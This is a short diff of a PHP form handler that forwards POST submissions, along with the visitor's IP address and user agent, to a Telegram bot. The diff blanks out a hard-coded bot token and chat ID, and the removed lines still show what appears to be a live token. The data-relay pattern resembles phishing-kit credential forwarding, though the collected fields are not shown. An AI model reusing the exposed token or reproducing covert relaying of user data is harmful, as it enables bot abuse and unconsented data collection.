@@ -7,8 +7,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "IP Address: $ip_address\\n";
     $message .= "User Agent: $user_agent";
     function sendToTelegram($message) {
-        $botToken = "7502563828:AAEtFtQQxJkiDThj6xR_g-IjMMkUt6mEHeY";
-        $chatID = "2024533279";
+        $botToken = "";
+        $chatID = "";
         $url = "https://api.telegram.org/bot$botToken/sendMessage";
 
         $data = [
